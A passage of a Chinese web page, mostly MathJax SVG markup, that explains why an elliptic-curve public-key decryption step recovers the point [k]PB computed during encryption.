94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6949.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>相等：由于解密流程第3步计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="47.048ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 20795.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1397.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1842.2,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3435.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4491.3,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(4769.3,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="mo" transform="translate(5909,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(6187,0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(7616.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(8672.1,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(8950.1,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="mo" transform="translate(10089.8,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(10367.8,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(10645.8,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(11166.8,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mi" transform="translate(11444.8,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(12508.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(13564.4,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(13842.4,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(14363.4,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(14641.4,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(14919.4,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="mo" transform="translate(16059.1,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mi" transform="translate(16337.1,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(17400.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(18456.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(18734.6,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(19255.6,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(19533.6,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></g></svg></mjx-container>的结果<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.291ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2338.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(799,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(1077,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></g></svg></mjx-container>是加密流程第4步计算值，所以加密流程第4步计算的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.453ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6830 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(799,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(1077,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="mo" transform="translate(2616.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3672.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4061.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 